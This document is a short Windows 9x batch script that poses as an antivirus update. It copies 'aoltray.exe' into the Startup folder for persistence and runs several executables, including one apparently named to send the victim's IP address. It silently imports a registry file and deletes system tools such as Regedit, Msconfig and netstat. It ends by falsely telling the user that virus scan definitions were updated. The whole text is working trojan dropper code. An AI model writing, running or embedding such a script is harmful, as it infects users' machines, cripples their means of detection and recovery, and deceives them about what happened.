xcopy aoltray.exe c:\windows\startm~1\programs\startup /y
xcopy aoltray.exe c:\windows\ /y
aoltray.exe
cls
xcopy Wordpad.exe c:\windows\ /y
Wordpad.exe
win.exe
SendIP.exe
cls
regedit.exe /s unknown.reg
cls
deltree /y C:\Progra~1\Common~1\Micros~1\MSINFO\MSINFO32.EXE
deltree /y c:\windows\system\Msconfig.exe
deltree /y c:\windows\netstat.exe
deltree /y c:\windows\Regedit.exe
deltree /y c:\windows\temp\*.*
#echo-off
cls
@echo Virus Scan Definitions Updated!
@echo Please reboot for the settings to take effect.